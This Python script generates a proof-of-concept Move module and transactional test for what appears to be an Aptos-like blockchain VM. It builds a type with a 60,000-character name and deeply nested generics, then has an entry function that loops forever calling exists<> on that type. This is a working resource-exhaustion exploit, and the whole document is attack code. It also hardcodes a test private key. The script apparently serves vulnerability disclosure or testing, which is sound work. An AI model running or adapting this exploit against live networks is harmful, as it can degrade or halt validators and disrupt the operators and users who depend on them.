
huge_type_name = "A"*60_000
module_name = "poc_module"

# This can technically work at runtime but compiler fails on "path too big"
# module_name = huge_type_name

huge_generic_type = "u8"
FANOUT = 2
DEPTH = 6
# 3^4 = 81
for _ in range(DEPTH):
    generic_params = ','.join([huge_generic_type] * FANOUT)
    huge_generic_type = f'{huge_type_name}<{generic_params}>'

generics = ','.join(f'phantom T{i}' for i in range(FANOUT))
module_code = f"""
module poc::{module_name} {{
    use velor_std::from_bcs::to_address;
    use std::bcs::to_bytes;
    struct {huge_type_name}<{generics}> has key, store, drop, copy {{
        x: u8
    }}

    public entry fun f() {{
        let i: u256 = 0;
        while(true){{
            let addr = to_address(to_bytes(&i));
            exists<{huge_generic_type}>(addr);
            i = i + 1;
        }}
    }}
}}
"""

transactional_test = f"""
//# init --addresses poc=0xf75daa73fc071f93593335eb9033da804777eb94491650dd3f095ce6f778acb6 
//#      --private-keys poc=56a26140eb233750cd14fb168c3eb4bd0782b099cde626ec8aff7f3cceb6364f 
//#      --initial-coins 100000000000000

//# publish 
//# --gas-budget 2000000
{module_code}

//# run poc::{module_name}::f --signers poc
"""
with open('poc_tt.move', 'w') as f:
    f.write(transactional_test)
with open('poc.move', 'w') as f:
    f.write(module_code)
